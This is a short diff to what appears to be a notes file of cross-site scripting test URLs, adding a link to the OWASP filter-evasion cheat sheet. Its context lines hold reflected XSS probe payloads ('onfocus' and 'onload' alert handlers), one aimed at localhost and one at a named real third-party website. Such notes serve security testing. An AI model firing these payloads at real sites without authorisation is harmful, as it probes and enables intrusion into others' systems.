@@ -4,3 +4,5 @@ http://localhost:5000/?search=<input onfocus=alert(123) autofocus>
 
 https://vidademotorista.com.br/?s=teste
 https://vidademotorista.com.br/?s=<svg onload=alert(123)>
+
+https://owasp.org/www-community/xss-filter-evasion-cheatsheet
